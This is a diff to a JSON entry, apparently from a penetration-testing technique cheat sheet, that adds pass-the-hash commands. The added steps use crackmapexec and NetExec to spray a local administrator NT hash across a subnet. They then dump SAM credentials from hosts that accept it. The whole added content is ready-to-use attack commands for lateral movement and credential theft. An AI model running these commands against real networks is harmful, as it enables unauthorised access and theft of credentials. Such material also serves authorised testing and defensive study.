@@ -83,5 +83,21 @@
   },
   "tools": [
     "crackmapexec"
+  ],
+  "variations": [
+    {
+      "label": "NetExec local-auth PtH sweep",
+      "command": "nxc smb <cidr> --local-auth -u administrator -H <nt_hash>"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Spray a local admin hash across the subnet",
+      "command": "crackmapexec smb --local-auth <cidr> -u administrator -H <nt_hash> | grep +"
+    },
+    {
+      "label": "Pwn3d! hosts = local admin -> dump creds",
+      "command": "crackmapexec smb <host> --local-auth -u administrator -H <nt_hash> --sam"
+    }
   ]
 }
